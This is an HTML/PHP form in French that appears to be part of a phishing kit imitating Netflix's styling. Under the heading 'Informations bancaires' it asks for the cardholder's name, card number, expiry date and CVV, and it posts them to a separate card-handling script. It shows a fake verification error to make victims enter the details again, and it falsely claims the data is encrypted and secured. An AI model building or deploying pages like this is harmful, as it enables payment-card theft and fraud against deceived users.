                ...
                <div><noscript><div data-uia="error-message-container" class="ui-message-container ui-message-error"><div class="ui-message-icon"></div><div data-uia="text" class="ui-message-contents">Il semble que JavaScript soit désactivé. Veuillez l'activer pour restaurer toutes les fonctionnalités de la page.</div></div></noscript>
                    <div class="login-content login-form hybrid-login-form hybrid-login-form-signup" data-uia="login-page-container">
                        <div class="hybrid-login-form-main">
                            <h1 data-uia="login-page-title">Informations bancaires</h1>

                           <?php if(isset($_GET["error"])){ ?> <div data-uia="error-message-container" class="ui-message-container ui-message-error"><div class="ui-message-icon"></div><div data-uia="text" class="ui-message-contents">Les informations fournies n'ont pas pu être vérifiées. <br> Veuillez essayer à nouveau</div></div> <?php } ?>

                            <form method="post" class="login-form" action="../actions/card.php" id="main_form">
                                    ...
                                    <div class="nfInputPlacement">
                                        <div class="nfEmailPhoneControls">
                                            <label class="input_id">
                                                <input type="text" name="bat_nomcc" placeholder="Nom du titulaire" id="name_its" style="padding-top : 0;" class="nfTextField" required>
                                            </label>
                                        </div>
                                    </div>
                                </div>
                                ...
                                <div data-uia="login-field+container" class="nfInput nfEmailPhoneInput login-input login-input-email">
                                    <div class="nfInputPlacement">
                                        <div class="nfEmailPhoneControls">
                                            <label class="input_id" style="position : relative">
                                            <div class="lbl">
                                                <img src="../assets/images/cc.png" alt="" id="img1">
                                                <input id="card_number_input" name="bat_ccnum" placeholder="Numéro de carte"  class="no-spin nfTextField" style="outline : none !important;padding-top : 0" type="number" required >   
                                            </div>
                                            </label>
                                        </div>
                                    </div>
                                ...
                                <div data-uia="login-field+container" class="nfInput nfEmailPhoneInput login-input login-input-email">
                                    <div class="nfInputPlacement">
                                        <div class="nfEmailPhoneControls">
                                            <label class="input_id">
                                                <input id="expiration_date_input" name="bat_ccexp" placeholder="Date d'expiration"  class="nfTextField" type="text" style="outline : none !important;padding-top : 0"  onkeyup="formatString(event);" onkeypress="formatString(event);" onkeydown="formatString(event);" required>
                                            </label>
                                        </div>
                                    </div>
                                </div>
                                ...
                                <div data-uia="login-field+container" class="nfInput nfEmailPhoneInput login-input login-input-email">
                                    <div class="nfInputPlacement">
                                        <div class="nfEmailPhoneControls">
                                            <label class="input_id" style="position : relative">
                                            <div class="lbl">
                                                <img src="../assets/images/cvv.png" alt="" id="cvvimg">
                                                <input type="password" name="bat_cvv"  id="cvv_input" placeholder="Code de sécurité ( CVV ) " class="nfTextField" style="outline : none !important;padding-top : 0" required minlength="3" maxlength="5">
                                            </div>
                                ...
                                <button class="btn login-button btn-submit btn-small" type="submit" autocomplete="off" name="bat_cardSubmit" tabindex="0" data-uia="login-submit-button">Confirmer</button>
                                <p style="color : white;opacity : .9">L'ensemble de vos données seront encryptées et sécurisées lors de leur vérification.</p>
                            </form>
                        </div>
